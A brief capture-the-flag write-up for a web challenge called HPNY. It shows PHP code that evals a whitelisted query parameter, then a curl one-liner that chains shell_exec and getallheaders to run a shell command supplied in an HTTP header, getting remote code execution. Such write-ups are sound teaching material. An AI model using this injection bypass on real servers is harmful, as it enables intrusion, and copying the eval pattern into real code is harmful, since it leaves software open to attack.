# HPNY (web 100)
> Get some lucky word or number for your new year!

First thing to do is visit URL without a query parameter to see the source.

Relevant code:
```php
$wl = preg_match('/^[a-z\(\)\_\.]+$/i', $_GET["roll"]);

if($wl === 0 || strlen($_GET["roll"]) > 50) {
    die("bumbadum badum");
}
eval("echo ".$_GET["roll"]."();");
```

Our input is `exec`'d after being filtered to only have `[a-z()_.]`.
We can call arbitrary methods but only pass a single paramter if any. My first idea was to be able to get data in from another source and pass it into `shell\_exec.`

We can do this by extracting the last element of getallheaders() and passing our command as the header.

```
curl "http://192.46.227.32/?roll=shell_exec(end(getallheaders())).time" -H "a: cat *"
```

First blood!
